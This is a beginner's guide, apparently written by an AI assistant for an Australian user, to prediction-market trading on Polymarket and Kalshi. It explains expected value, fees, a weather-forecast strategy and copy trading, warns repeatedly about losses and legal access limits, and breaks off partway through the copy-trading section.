# The Complete Beginner's Guide to Trading Prediction Markets
### Weather, Copy Trading, and Building Your Own Bot — Explained From Absolute Zero

*Written for someone who knows nothing about prediction markets, crypto, trading, or coding — and wants to understand all of it properly before risking a single dollar.*

---

## How To Read This Guide

You don't need any background. Every term is explained the first time it appears. I use a lot of plain-language analogies and worked examples with real numbers. When you see a box like this:

> **🧠 In plain English:** A quick, simple restatement of the idea you just read, with no jargon.

…that's me making sure the concept actually landed before we move on.

Read it in order. Each part builds on the one before. If a section feels obvious, skim it — but the "boring" parts (money plumbing, expected value, risk management) are the ones that decide whether you make money or lose it, so don't skip them.

There is a **Glossary** at the very end. If you forget what a word means, it's there.

---

# PART 0 — READ THIS FIRST (The Honest Truth)

Before any strategy, you need the real picture. I'm going to tell you things that the YouTube videos and the people selling bots will not, because I'm not selling you anything.

## 0.1 The promise

Yes — it is genuinely possible to make money trading prediction markets. There are real, documented people who have made hundreds of thousands to millions of dollars, especially trading **weather**. The edge they use is real, it's based on public data, and you can learn it. This guide teaches you exactly how it works.

## 0.2 The warning (please actually read this)

You told me: *"if this works I will put in all of my money."*

**Do not do that. Ever. I mean it.** Here is why, in plain numbers:

- On Polymarket, roughly **88% of all users lose money.** Only about 1 in 8 are profitable. By some measures only ~12% of accounts are net positive.
- Of the traders people try to copy, around **80% are either unprofitable long-term or win for reasons you can't replicate.**
- The weather edge — the best one — is **real but thin.** The honest, verified results from a good public weather bot were about **+27% return over a stretch with a 60% win rate on tiny stakes.** That's good! But it is NOT "turn $100 into $5,000 next week." The thumbnails that say that are lying or selling something.
- Even a genuinely profitable strategy goes through losing streaks. If you bet too big, a normal losing streak wipes you out *before* your edge has time to show up. This is called "risk of ruin," and it's the #1 killer of new traders. We have a whole section on it.

> **🧠 In plain English:** This is a skill, like learning to fly a plane. The edge is real, but if you bet your whole life savings while you're still a beginner, a perfectly normal run of bad luck will destroy you before your skill ever pays off. **Money you put here should be money you could set on fire and still sleep fine.** Start tiny. Scale only after you've proven — with real records — that *you* can do this.

## 0.3 The legal reality for you specifically

You appear to be in **Australia**. As of 2025–2026, **both** of the main platforms this guide covers — **Polymarket and Kalshi** — **block Australian users.** Polymarket was ordered blocked by the Australian regulator (ACMA) at the internet-provider level. Using a VPN to get around it breaks the platform's rules and gives you **no legal protection if your funds get frozen** — and no Australian authority can help you get them back.

I'm not telling you what to do about that. I'm telling you it's the **first real decision**, before any strategy matters. We cover it properly in Part 2 and Part 9. Just know now: the "how to trade" knowledge in this guide is universal and worth learning, but the "where to actually do it" question is a genuine hurdle for you that we have to solve separately.

## 0.4 The six hard truths (memorize these)

1. **Most people lose.** Your goal is to be the exception by having a real edge and real discipline — not hope.
2. **The edge is thin and statistical.** You win slightly more than half the time, over hundreds of trades. No single trade matters.
3. **Fees and spreads eat thin edges.** A strategy that looks profitable before costs can be a loser after costs. We always do the after-costs math.
4. **Never risk money you can't afford to lose.** And never your whole bankroll on one bet — not even close.
5. **Boring and small wins.** The people who blow up are the ones chasing excitement and big bets.
6. **If someone is selling you a guaranteed-profit bot, they make money from selling the bot, not from the bot.** Be skeptical of everything, including this guide — verify as you go.

## 0.5 How this guide is structured

- **Parts 1–3:** The foundations. What these markets are, how the money works, and *why* it's possible to win. (Don't skip — this is where understanding actually comes from.)
- **Parts 4–6:** The three strategies in depth — Weather (the main one), Copy Trading, and Bitcoin (which we'll explain and then mostly reject).
- **Part 7:** Building your own bot with Claude Code (you already have this tool — it's a huge advantage).
- **Part 8:** Risk and psychology — the part that actually determines success.
- **Part 9:** Your step-by-step roadmap from zero to (maybe) live.
- **Part 10:** Reference — glossary, tools, traders, data sources, scam warnings.

Let's begin.

# PART 1 — THE ABSOLUTE BASICS: What Is A Prediction Market?

## 1.1 The one-sentence version

**A prediction market is a place where you bet on whether something will happen, and the price of the bet tells you what the crowd thinks the chance is.**

That's it. Everything else is detail.

## 1.2 The analogy that makes it click

Imagine a question: *"Will it rain in Sydney tomorrow?"*

Now imagine a special kind of ticket. This ticket pays you **exactly $1 if it rains**, and **$0 if it doesn't.**

How much would you pay for that ticket *today*, before you know the weather?

- If you're pretty sure it'll rain (say 80% sure), you'd happily pay up to 80 cents for it. (Pay 80¢, get $1 → good deal if you're right often enough.)
- If rain seems unlikely (20% chance), you'd only pay around 20 cents.

So **the price of the ticket, in cents, is basically the percentage chance the crowd gives the event.** A ticket trading at 65¢ means "the market thinks there's a 65% chance this happens."

A prediction market is just a giant marketplace of these $1-or-$0 tickets, for thousands of questions: elections, sports, crypto prices, the weather, the Oscars, anything with a clear yes/no answer and a known resolution date.

> **🧠 In plain English:** Price = probability. A 30¢ price means "30% chance." You're buying tickets that pay $1 if you're right and $0 if you're wrong. Your job is to find tickets that are **mispriced** — where you have good reason to believe the real chance is higher than the price says.

## 1.3 "Yes" shares and "No" shares

Every market has two sides:

- A **"Yes" share** pays $1 if the event happens.
- A **"No" share** pays $1 if the event does *not* happen.

The two prices always add up to about $1 (100¢). If "Yes" is 70¢, then "No" is about 30¢. That makes sense: the chance it happens plus the chance it doesn't = 100%.

You can buy whichever side you think is underpriced. If you think the crowd is too pessimistic about rain, you buy "Yes." If you think they're too optimistic, you buy "No."

## 1.4 A complete worked example (start to finish)

Let's walk through one full trade, slowly.

**The market:** "Will the high temperature at New York's LaGuardia airport be 75°F or higher tomorrow?"

**Current prices:** Yes = 40¢, No = 60¢. (The crowd thinks there's a 40% chance.)

**Your research:** You checked the professional weather forecasts (we'll learn how), and they strongly suggest it'll be hot — you estimate the *real* chance is more like 65%.

**Your read:** The "Yes" ticket is selling for 40¢ but you think it's really worth ~65¢. It's underpriced. You buy.

**You buy 100 "Yes" shares at 40¢ each.** Cost: 100 × $0.40 = **$40.**

**Two outcomes:**

- **It hits 75°F+ (Yes wins):** Each share pays $1. You get 100 × $1 = **$100.** You turned $40 into $100 — a **$60 profit.**
- **It stays below 75°F (No wins):** Each share pays $0. You get **nothing.** You lost your **$40.**

**Was this a good bet?** Even though you could lose, *yes* — if your 65% estimate is right, then on average this bet is worth: (65% × $100) + (35% × $0) = **$65** of expected value, for a cost of $40. Paying $40 for something worth $65 on average is a great trade, **even though you'll lose it 35% of the time.** This idea — winning on average even while losing individual bets — is the absolute heart of everything. We'll formalize it in Part 3 ("Expected Value").

> **🧠 In plain English:** You don't need to win every trade. You need to consistently buy tickets for *less* than they're really worth. Do that hundreds of times and the math grinds out a profit, even though plenty of individual bets lose.

## 1.5 How you actually make money (two ways)

There are two ways to profit from a share you bought:

1. **Hold it until the event resolves.** If you're right, each share becomes $1. (This is the example above.)
2. **Sell it early to someone else** at a higher price than you paid. If you bought "Yes" at 40¢ and good news pushes the price to 70¢, you can sell and pocket 30¢ per share *without waiting for the final result.* This is just like selling a stock that went up.

Both are valid. Beginners should mostly think in terms of #1 (hold to resolution) because it's simpler. Advanced traders do a lot of #2.

## 1.6 Where does the profit come from? (Important reality check)

This is critical to understand: **prediction markets are "zero-sum" (minus fees).** That means every dollar you win comes out of another trader's pocket, and every dollar you lose goes into someone else's. There's no company "creating" returns like a savings account.

So when you make a winning trade, you're effectively taking money from someone on the other side who was **wrong** about the probability. Your edge comes from being **more right than the people you're trading against.**

This tells you exactly who you want to trade against: **casual, emotional, uninformed bettors** — people guessing about the weather with their gut. And it tells you who you *don't* want to trade against: **fast professional bots** that react in milliseconds. A huge part of strategy is choosing markets full of the former and empty of the latter. (This is why we'll favor "secondary" weather cities later — fewer bots, more casuals.)

> **🧠 In plain English:** You're not beating "the house." You're beating *other people.* Pick fights with weak opponents (casual gamblers), avoid fights with strong ones (pro bots). Your profit is literally their mistake.

## 1.7 Vocabulary so far

- **Prediction market:** a marketplace for $1-or-$0 tickets on yes/no questions.
- **Share / contract:** one ticket. Pays $1 if you're right, $0 if wrong.
- **Yes share / No share:** the two sides of a market.
- **Price:** what a share costs now, in cents. **Equals the crowd's probability estimate.**
- **Resolution:** when the event's outcome becomes known and shares pay out.
- **Resolution source:** the official thing that decides the outcome (e.g. the official weather report).
- **Zero-sum:** your winnings come from other traders' losses, and vice versa.
- **Edge:** the reason you expect to win — being more accurate than your opponents.

---

# PART 2 — THE PLUMBING: Money, Wallets, and the Boring Essentials

This part isn't exciting, but you cannot trade without understanding it, and misunderstanding it is how beginners lose money to mistakes (not even bad bets — just operational errors). Read carefully.

## 2.1 The money is "USDC," a digital dollar

Polymarket doesn't use regular bank dollars directly. It uses **USDC**, which is a **stablecoin** — a digital token that is always worth **1 US dollar.** Think of it as a "dollar coin" that lives on the internet. 1 USDC = $1, basically always.

There's a specific version on Polymarket called **USDC.e** (a "bridged" version of USDC). One real-world tip from people who trade there: **when funding a trading bot, use USDC.e specifically**, because plain USDC sometimes causes technical hiccups. For manual trading the app handles this for you.

> **🧠 In plain English:** USDC is just "dollars, but digital." You'll convert your real money into USDC to trade, and convert USDC back into real money to cash out.

## 2.2 What is a "wallet," "Polygon," and "gas"?

- **A crypto wallet** is like an online account that *you* control with a secret key (a long password called a "private key"). Your USDC lives in your wallet. **Whoever has the private key controls the money** — so guarding it is everything. Polymarket can create a simple wallet for you automatically when you sign up; you don't have to be a crypto expert.

- **Polygon** is the "network" (think: the highway) that Polymarket's money runs on. It's a fast, cheap version of the Ethereum blockchain. You don't need to understand blockchains deeply — just know your USDC sits "on Polygon."

- **Gas** is a tiny fee you pay the network to process a transaction (like a postage stamp). On Polygon it's a fraction of a cent, paid in a token called **POL**. If you run a bot, you keep a dollar or two of POL around to cover these stamps. For normal app use, it's mostly invisible.

> **🧠 In plain English:** Your money (USDC) sits in a wallet (your account) on Polygon (the highway), and tiny "gas" fees (POL) are the toll for each transaction. The app hides most of this; bot-builders deal with it directly.

## 2.3 How money flows in and out

The normal path:

1. Buy USDC on a regular crypto exchange (Coinbase, Kraken, Binance, etc.) with your bank card or transfer.
2. Send (withdraw) that USDC to your Polymarket wallet, choosing the **Polygon** network.
3. Trade.
4. To cash out: send USDC from Polymarket back to the exchange, sell it for real dollars, withdraw to your bank.

**KYC** ("Know Your Customer") is the identity check — usually a photo of your ID and a selfie — that exchanges and the regulated platform require. It's normal and takes a few minutes.

## 2.4 Fees and spreads — the hidden costs that kill thin edges

Two costs eat into every trade. You MUST account for them or you'll think you're winning when you're not.

**1. The trading fee (the "taker fee").**
On Polymarket's **weather markets**, there's about a **1.25% fee** when you take an existing offer (a "market order"). There's a clever detail: the fee is **highest when prices are near 50¢** and shrinks toward the extremes (near 1¢ or 99¢). So cheap "long-shot" tickets at 5–15¢ are cheap to trade; 50/50 tickets cost the most in fees.

**The maker trick:** If instead of instantly taking a price you **post a limit order** (an offer to buy at a specific price and wait for someone to accept), you are a "maker" — and **makers pay ZERO fee.** This is a real, free edge-saver. We'll use it.

**2. The spread (the invisible cost).**
The **spread** is the gap between the best price to buy and the best price to sell. Example: maybe you can buy "Yes" at 42¢ but could only immediately sell it at 38¢. That 4¢ gap is a cost you pay just for entering and exiting — even though it's not labeled a "fee."

- On busy, liquid markets the spread is tiny (1–2¢).
- On quiet "niche" markets it can be **5–10¢**, which is a huge **5–10%** round-trip cost.

**The painful irony:** the best *edges* are in quiet niche markets (fewer bots) — but those have the *worst* spreads. So your edge has to be big enough to clear **both** the 1.25% fee **and** the 5–10% spread. This is exactly why we use limit orders (zero fee) and only trade when the mispricing is large.

> **🧠 In plain English:** Every trade has a toll: a ~1.25% fee (which you can dodge by using limit orders instead of instant ones) plus a hidden "spread" cost that's worst in the quiet markets where the best edges live. **A 5% edge in a market with a 6% spread is a losing trade.** Always subtract costs before believing an edge is real.

## 2.5 The Australia problem (your specific blocker)

I covered this in Part 0, but here's the fuller picture because it's genuinely the first thing you must resolve.

- **Polymarket** has been blocked in Australia since **August 2025**, by order of the regulator **ACMA**, which classified it as illegal gambling. The block is enforced by your internet provider.
- **Kalshi** (the big US-regulated competitor, which *also* has weather markets) **also excludes Australia** (along with the UK and Canada).
- A **VPN** (software that hides your location) can sometimes get you past the *technical* block, but it **violates the platforms' terms of service**, and crucially: **if your money gets frozen or a dispute arises, you have zero legal protection and no Australian body that can help you recover funds.** That's a real, money-losing risk that has nothing to do with your trading skill.

**What this means practically:** Learn everything in this guide — the knowledge is universal and valuable. But treat "which platform can I legally and safely use from where I am?" as **a separate problem we solve before you fund anything.** Possible directions (each needs its own due diligence, and I'm not advising any specific one): checking smaller prediction venues that accept Australian users, whether you have a legitimate non-Australian residency/entity, or simply paper-trading (practicing with fake money) until your situation changes. We'll come back to this in your roadmap (Part 9).

> **🧠 In plain English:** Right now, from Australia, you can't cleanly or safely use the two best platforms. Don't let that stop you from *learning* — but don't fund real money until the "where do I legally trade" question has a real answer. The skill is portable; the access problem is solvable separately, and rushing it is how you lose money to something other than trading.

# PART 3 — WHY YOU CAN WIN: The Concept of "Edge"

This is the most important conceptual part of the guide. If you understand this part deeply, everything else is just application. Read it twice.

## 3.1 What "edge" really means

**Edge** is any reason you can expect to win more than you lose, on average, over many trades. In these markets, your edge is **information or judgment that's more accurate than the price.**

The casino analogy: a casino doesn't win every spin of the roulette wheel. It loses constantly, all night long. But the rules give it a tiny mathematical advantage on every bet, so over **millions** of spins it grinds out a reliable profit. **You want to be the casino, not the gambler.** Your "house edge" is being more accurate than the crowd about specific outcomes.

## 3.2 The mispricing: where edge comes from

Remember: price = the crowd's probability. Your edge exists when you can confidently say *"the real probability is different from this price."*

- Market says "Yes" is 40¢ (40% chance). Your good research says it's really 65%. → "Yes" is **underpriced** → you buy Yes.
- Market says "Yes" is 80¢ (80% chance). Your research says it's really 55%. → "Yes" is **overpriced** → you buy No (which is selling for 20¢ but really worth ~45¢).

The gap between *your* probability and the *market's* probability is your edge. The bigger and more reliable that gap, the better.

## 3.3 Expected Value (EV) — the single most important calculation

**Expected Value (EV)** is the average outcome of a bet if you could repeat it many times. It's how you decide whether a trade is worth making. Here's the formula, built from scratch:

> **EV = (chance you win × amount you win) − (chance you lose × amount you lose)**

Let's use our earlier example. You buy a "Yes" share at 40¢. You believe the true chance is 65%.

- If you win (65% of the time): each share goes from 40¢ to $1.00, so you **gain 60¢.**
- If you lose (35% of the time): the share goes to $0, so you **lose your 40¢.**

EV per share = (0.65 × $0.60) − (0.35 × $0.40)
EV per share = $0.39 − $0.14 = **+$0.25**

A **positive EV (+25¢ per share here)** means this is a money-making bet *on average*. A negative EV means it's a losing bet on average, even if it might win this once. **You only ever want to make positive-EV bets**, and the bigger the EV, the better.

> **🧠 In plain English:** EV is "if I made this exact bet 1,000 times, would I end up ahead or behind?" Positive = ahead = make the bet. Negative = behind = skip it, no matter how tempting. Professional trading is just relentlessly making positive-EV bets and refusing negative-EV ones.

**Now subtract costs.** That +25¢ was *before* fees and spread. If the spread cost you 5¢ and fees another cent, your real EV is ~19¢. Still positive — good trade. But if your edge had only been +4¢ and costs were 6¢, your *real* EV would be **negative** — a trap. **Always do the after-costs EV.**

## 3.4 Why most people lose (the four horsemen)

Now you can understand *exactly* why ~88% of users lose:

1. **No real edge.** They bet on gut feeling, so their probability estimates are no better than the price. Their average EV is roughly zero before costs — and **negative after costs.** Costs alone slowly bleed them dry.
2. **Overtrading.** They make tons of bets, many with no edge, multiplying their exposure to costs and variance.
3. **Betting too big.** They put huge amounts on single bets, so one bad run wipes them out before any edge pays off.
4. **Emotion.** They chase losses, get greedy in wins, and abandon their rules exactly when discipline matters most.

Your entire job is to avoid these four. **Have a real edge, trade selectively, bet small, follow rules mechanically.** That's the whole game.

## 3.5 The three sources of edge in these markets

Where does a *real* edge actually come from? Practically, three places:

1. **Information edge (being more accurate):** You have better data or analysis than the crowd. **This is the weather strategy** — you read professional forecast models the casual bettors ignore. This is the most reproducible edge for a normal person.

2. **Speed edge (being faster):** You react to new information before the price updates. This is the "latency arbitrage" world — and it's dominated by **professional bots** with millisecond reactions. As a human you basically **cannot win here**, which is why we reject the Bitcoin strategy later.

3. **Selection/discipline edge (copying or being patient):** You copy genuinely skilled traders, or you simply have better risk discipline than emotional gamblers. This is **copy trading** — powerful but tricky, because most "top traders" are either bots (can't copy) or lucky (won't repeat).

This guide focuses on **#1 (weather = information edge)** as your best shot, with **#3 (copy trading)** as a secondary option, and explicitly avoids **#2 (speed)** because you'd lose to bots.

---

# PART 4 — STRATEGY 1: WEATHER TRADING (The Main Event)

This is the strategy worth learning first and best. It's where the realest, most documented money is, and it's an **information edge** — exactly the kind a disciplined individual can actually capture. We'll go slow and thorough.

## 4.1 Why weather is the best market for a beginner with an edge

Four reasons weather is special:

1. **The answer is 100% objective.** "Was the high temperature 75°F?" is settled by an official government weather report — no judgment, no controversy, no rug-pull. Compare that to "Will this politician win?" which can be messy.

2. **The casuals are clueless and emotional.** Lots of people bet on weather markets with their gut ("feels hot today, I'll buy Yes"). They are exactly the weak opponents you want — they create the mispricings you profit from.

3. **Professional forecasts are free and public.** The same weather models that meteorologists and airlines use are available to you for free. The casual bettors don't bother checking them. **That gap — pros' models vs casuals' guesses — is your edge.**

4. **Fast feedback.** Markets resolve **daily.** You find out if you were right within a day, so you learn and improve quickly (instead of waiting months like an election market).

> **🧠 In plain English:** Weather is a fair, objective game, full of clueless opponents, where the "answer key" (professional forecasts) is free and public and most opponents don't read it. That's about as good as it gets for an information edge.

## 4.2 How a weather market actually works

A typical market: **"What will the highest temperature be in New York City tomorrow?"**

Instead of one yes/no, it's usually split into **temperature buckets**, each its own yes/no ticket:

- 70°F or below
- 71–72°F
- 73–74°F
- 75–76°F
- 77°F or above

Each bucket has a Yes price. They're like horses in a race — exactly one bucket will win (the actual high temp lands in exactly one range). The prices across all buckets add up to ~100%.

**The resolution source — read this carefully, it's where beginners lose:**

- The market resolves based on the official **NWS Daily Climate Report (CLI)** — a government weather summary — for **one specific weather station**, almost always a **specific airport.**
- **New York resolves at LaGuardia Airport (code KLGA). Dallas resolves at Love Field (KDAL), NOT the bigger DFW airport.** Every market names its exact station in its rules.
- It settles at **8:00 AM the next day** (US Eastern time), once the official report is out.

**Why the station matters so much:** The temperature at the *airport* can be several degrees different from the temperature in the *city center*. For example, LaGuardia (right on the water) can run **3–5°F cooler** than Midtown Manhattan on a hot day. Casual bettors look at the temperature on their phone (city center) and bet wrong. **If you analyze the airport station specifically, you have an edge over everyone using the city-center number.** This one detail is worth real money.

> **🧠 In plain English:** You're betting on the temperature **at a specific airport**, decided by an official government report the next morning. Most people accidentally analyze the wrong location (their city) instead of the airport. Always check, and always analyze, the exact airport station named in the market's rules.

## 4.3 Weather forecasting 101 (you need just enough)

You don't need to become a meteorologist. You need to understand a few concepts:

**Forecast models.** Supercomputers run physics simulations of the atmosphere to predict future weather. The big ones:
- **GFS** — the American model (run by NOAA, the US weather agency).
- **ECMWF** — the European model (often considered the most accurate).
- **ICON** — the German model.
- **HRRR** — a high-resolution short-range US model.

**Model runs (this timing is your edge!).** These models don't update continuously — they run on a **fixed schedule**, a few times a day, and release a fresh forecast each time:
- **GFS** updates 4× daily: at 00:00, 06:00, 12:00, and 18:00 UTC (UTC = the global reference time).
- **ECMWF** updates 2× daily: at 00:00 and 12:00 UTC.

When a new run comes out and the forecast **changes**, the *informed* world updates instantly — but the **market price often lags** because the casual bettors haven't noticed. **That lag is a golden window to trade before the price catches up.**

**Ensembles (the pro move).** Instead of running a model once, you run it **many times** with slightly different starting conditions, producing dozens of slightly different forecasts (an "ensemble"). If 28 out of 31 ensemble runs say "75°F or higher," that's a strong **83% probability** signal (28÷31). **Ensembles turn a forecast into a probability** — which is exactly what you need to compare against the market price. The best weather bots use ensembles with 30 to 170+ members.

> **🧠 In plain English:** Weather models are free supercomputer forecasts that refresh on a fixed clock a few times a day. Run a model many times (an "ensemble") and you get a probability, not just a guess — e.g. "80% chance it's 75°F+." When a fresh model run shifts the forecast, the market is slow to react, and that delay is your moment to trade.

## 4.4 The core edge, stated simply

Here is the entire weather strategy in one line:

> **Compare the model's probability to the market's price. When they disagree by enough, bet on the model.**

Concretely:
- Your ensemble says the "75°F+" bucket has an **80%** true chance.
- The market is pricing that bucket at **55¢** (i.e. 55%).
- That's a **25-point gap** in your favor. The ticket is worth ~80¢ but sells for 55¢. **Buy it.** Positive EV.

That's the whole engine. Everything else — the specific thresholds, the cities, the sizing — is just making this safe and repeatable.

## 4.5 The airport-station trick (worth repeating)

We covered it above but it's so important it gets its own reminder: **always analyze the exact airport station the market resolves on, not the city.** Free tools let you check the specific station. The systematic gap between airport and city-center readings is a predictable, repeatable edge because most of your opponents are using the wrong number. Learn your target city's airport quirk (coastal stations run cooler with a sea breeze; inland airports can run hotter, etc.).

## 4.6 Advection / "nowcasting" — the advanced intraday edge

Here's a more advanced edge that experienced weather traders swear by. The fancy word is **advection**, which just means **air being blown in horizontally** — a mass of warm or cold air moving into the area.

The insight: the day-ahead forecast made its best guess, but as the day actually unfolds, you can watch the **real-time airport observations** (called **METAR** reports — updated readings straight from the airport, free from `api.weather.gov`). If you see a warm air mass arriving *faster* than the forecast assumed, you know the high temperature will likely beat the forecast — and you can trade that **before the market reprices.** This is called **nowcasting**: using what's happening *right now* to refine the day-ahead forecast.

> **🧠 In plain English:** The forecast is yesterday's best guess; the live airport readings are today's reality. When reality is running hotter or colder than the forecast assumed, you can see it in the live data and trade it before everyone else notices. (Don't worry about mastering this on day one — it's a level-2 skill. Just know it exists.)

## 4.7 The exact entry rules (a real checklist)

Here's a concrete, professional-grade rule set for *when* to actually place a weather trade. Only buy a bucket when **all** of these are true:

1. **Big enough edge:** your ensemble probability is at least **8 percentage points above** the market's price for that bucket. (Some bots use asymmetric thresholds — e.g. require only ~5 points to bet "No" on an overpriced bucket, but 15 points to bet "Yes" — because backing a specific outcome is riskier than fading one.)
2. **Close enough in time:** the forecast is for **48 hours away or less.** (Forecasts get much more reliable the closer you are.)
3. **Models agree:** the GFS and ECMWF ensembles **agree within about 1.5°C** on the day's high. If the models are fighting each other, sit out — the uncertainty is too high.
4. **Enough money in the market:** the market has at least **~$10,000** of trading volume, so you can actually get in and out without a terrible spread.
5. **"Stay out of the middle":** prefer buckets that aren't right at the razor's edge of the forecast. Leave roughly a **3°F buffer** around the ensemble's central guess to avoid the highest-variance, coin-flip buckets. The cleaner money is on buckets the models clearly favor or clearly reject.

If even one condition fails, **don't trade.** Discipline is the edge. The number of trades you *skip* matters as much as the ones you take.

## 4.8 Position sizing: how much to bet (the Kelly Criterion, gently)

Once you've found a good bet, *how much* of your money do you put on it? Too little and you barely profit; too much and a losing streak ruins you. There's a famous formula for the mathematically optimal amount: the **Kelly Criterion.**

You don't need the full math. Here's what matters:

- Kelly tells you to bet **more when your edge is bigger and your confidence is higher**, and **less when it's smaller.**
- The full Kelly amount is actually **too aggressive** for real life (it swings your account wildly). So professionals use **"fractional Kelly"** — typically **a quarter (0.25) or even 15% (0.15) of what the formula says.** This dramatically smooths out the ride while keeping most of the growth.
- On top of that, smart traders add a hard cap: **never more than ~5% of your total bankroll on any single position**, and often a fixed dollar cap (like "$20 max per trade") while learning.

So a practical sizing rule for a beginner:

> **Bet a small, fixed amount per trade (e.g. $1–$5) while learning. Once you have 100+ logged trades proving your edge, move to fractional Kelly (0.25) with a hard cap of 5% of bankroll per bet.**

> **🧠 In plain English:** Bet bigger when you're more sure, smaller when less — but always use a *fraction* of the "optimal" amount, because the optimal amount is a stomach-churning rollercoaster that can still wipe you out. And never, ever put a big chunk of your bankroll on one bet. Small and steady is how the edge actually compounds.

## 4.9 Two classic weather tactics: laddering and the barbell

**Laddering.** Instead of betting one bucket, buy several **adjacent** buckets cheaply (some at 5¢, 10¢, 15¢). The actual temperature will land in one of them. One or two winners at $1 easily cover the small losers. It's like buying a few neighboring lottery numbers when you're confident the winner is in that neighborhood.

**The barbell (used by the famous "ColdMath" trader).** Combine **many tiny bets on cheap long-shot buckets** (5–15¢ tickets that the market underprices) with **occasional bigger bets on the buckets the models strongly favor.** The cheap long-shots occasionally pay off big (a 10¢ ticket becoming $1 is a 10× return), while the high-confidence bets provide steadier wins. The famous practitioners of this made six figures doing it with discipline, not fancy math.

## 4.10 Which cities to trade (and why "boring" ones win)

Here's a counter-intuitive but crucial point. The big famous cities — **New York, London, Hong Kong, Miami** — have the most trading volume, which sounds good, but they're **saturated with professional bots** that grab any edge within 5–15 minutes. You'll be racing machines.

The money is in **secondary cities** — places like **Buenos Aires, Cape Town, Dallas, Atlanta.** They have:
- Wider mispricings (fewer sharp traders).
- **Edge windows that last hours, not minutes** (the bots aren't watching closely).
- More of those clueless casual opponents.

The trade-off: secondary cities have **wider spreads** (that hidden cost from Part 2), so your edge must be bigger to overcome it. But for a human who can't out-speed bots, **less-watched markets are where you actually have a chance.**

> **🧠 In plain English:** Don't fight the bots in the famous cities. Go where the bots aren't — the boring secondary cities — where mispricings are bigger and last long enough for a human to act. Just make sure your edge clears the wider spread.

## 4.11 The costs reality check (do this every time)

Let's put it together with honest numbers, because this is where dreams meet arithmetic.

Say you find a bucket where your edge is **+12 points** (you think 67%, market says 55¢). Looks great. Now subtract costs:
- **Spread** in a secondary city: ~6¢ round trip.
- **Fee:** ~1.25% if you use a market order — but **0% if you use a limit order** (the maker trick).

If you use a limit order (0 fee) and the spread effectively costs you ~3¢ on entry, your real edge is roughly 12 − 3 = **~9 points.** Still clearly positive — good trade.

But if your edge had only been **+5 points** and the spread cost 6¢, you'd be **negative after costs** — a trap that *looks* like a winner. This is exactly why the rules in 4.7 demand a **minimum 8-point edge**: it's the buffer that keeps you positive *after* costs.

> **🧠 In plain English:** Always subtract the spread and fee from your edge before deciding. The 8-point minimum edge rule exists precisely so that, after costs, you're still comfortably positive. Use limit orders to kill the fee. Skip anything that's only barely positive before costs.

## 4.12 STEP-BY-STEP: Your first manual weather trade (no coding, no bot)

This is the cheapest, safest way to *learn the edge with your own hands* before automating anything. (Do this on paper or with tiny amounts first — and remember the Australia access caveat from Part 2.)

**Tools you'll use (all free):**
- **Windy.com** — has a "compare models" view showing GFS, ECMWF, and ICON side by side.
- **Tropical Tidbits** — raw model output for the serious view.
- **api.weather.gov** — official US forecasts and live airport (METAR) observations.

**The daily routine:**

1. **Pick 1–2 cities.** As a learner, pick cities you can get good data for. (The pros favor secondary cities for edge, but for *learning*, clear data matters most.)
2. **Find the exact airport station** the market resolves on (it's in the market's rules — e.g. KLGA for NYC). Always analyze *that* station.
3. **Check the models** on Windy's compare view. Look at the forecast high for tomorrow from GFS, ECMWF, ICON.
4. **Look for agreement.** If all three models cluster around the same temperature range, the true probability of that range is high (often 70–90%).
5. **Open the weather market** and read the bucket prices.
6. **Find the mismatch.** Is a bucket the models strongly favor selling cheap (e.g. models say 80%, market says 55¢)? Is a bucket the models reject selling expensive? That's your trade.
7. **Apply the checklist (4.7).** Edge ≥ 8 points? Within 48 hours? Models agree within ~1.5°C? Enough volume? Not a coin-flip middle bucket?
8. **Place a small limit order** (to pay zero fee) on the underpriced bucket.
9. **Log everything** in a spreadsheet: date, city, bucket, your probability, the price, your bet size, and later the result. **This log is how you'll know if you actually have an edge.**
10. **Repeat daily.** After ~100 logged trades, look at your numbers. Are you winning more than your costs? If yes, you've proven an edge and can consider sizing up or automating. If no, figure out why *before* risking more.

> **🧠 In plain English:** Check free forecasts → find where the models and the market disagree → bet small on the model when the disagreement is big enough → write down every trade → judge yourself honestly after 100 trades. This is the entire job, done by hand. Master it manually and a bot is just doing this faster while you sleep.

## 4.13 What to *realistically* expect

Let's anchor your expectations to reality, not thumbnails:

- A solid, honest, **public** weather bot's verified record over a real stretch was about **+27% return, ~60% win rate, on roughly $279 of stakes** — netting tens of dollars. Good, real, repeatable — but small in absolute terms until you scale.
- The famous big winners (hundreds of thousands to millions) got there by running this edge across **dozens of cities simultaneously, thousands of trades, over many months, with serious capital** — after they'd proven the edge.
- You will have **losing days and losing weeks.** A 60% win rate means you lose 40% of the time. That's normal and fine *if* your sizing is small enough to survive the streaks.
- The "$80k/month" and "1,266% in 4 minutes" videos are marketing. Ignore the numbers; some of the *methods* are still useful to learn from.

> **🧠 In plain English:** Expect a small, real, grinding edge — not a jackpot. The big winners are people who ran a small edge millions of times with discipline and patience. Your first goal isn't profit; it's *proving to yourself you have an edge at all,* with tiny stakes.

# PART 5 — STRATEGY 2: COPY TRADING

## 5.1 The simple idea

Some traders are genuinely skilled and profitable. **Copy trading** means automatically making the same bets they make, sized to your own bankroll. When they buy, you buy the same thing; when they sell, you sell. The dream: ride a pro's coattails without doing the research yourself.

It's a real thing — there are tools that watch a chosen trader's wallet and mirror their moves into yours within seconds, and you keep full control of your own money (the tools are "non-custodial," meaning they never hold your funds).

## 5.2 Why it's much harder than it sounds (read before you get excited)

Copy trading sounds like free money. It mostly isn't, for specific reasons:

1. **Most "top traders" are bots you cannot replicate.** On Polymarket, **14 of the top 20 wallets are automated bots.** Their edge is *speed* (millisecond reactions) or *market-making* (earning the spread). If you copy them, your trade arrives a second or two later — **at a worse price** — and the edge is already gone. You get the risk without the reward.

2. **~80% of the wallets people choose to copy are traps.** They're either not actually profitable long-term, or they got lucky on a few big bets (not a repeatable skill), or — for about **15% of wallets** — their track record is **faked** through wash trading (trading with themselves to look successful).

3. **Latency kills fast strategies.** In any market that moves quickly, the copy delay means you systematically get worse fills than the trader you're copying. Copy trading only really works in **slower markets** (politics, sports, longer-horizon events) where a 1–2 second delay doesn't matter.

> **🧠 In plain English:** You can't copy the bots (you're too slow), and most of the humans who *look* great are lucky or fake. Copy trading can work — but only if you copy genuinely skilled *human* traders in *slow* markets, and only after carefully filtering out the traps. It is NOT "pick the #1 name and get rich."

## 5.3 How to find a trader actually worth copying (the filters)

If you do this, be ruthless. Only consider a trader who passes **all** of these:

- **Win rate above ~55–60%**, measured over **at least 200 trades.** (A high win rate on 10 trades is luck; on 200+ it's probably skill.)
- **At least 4 months of track record.** Long enough to have survived different conditions.
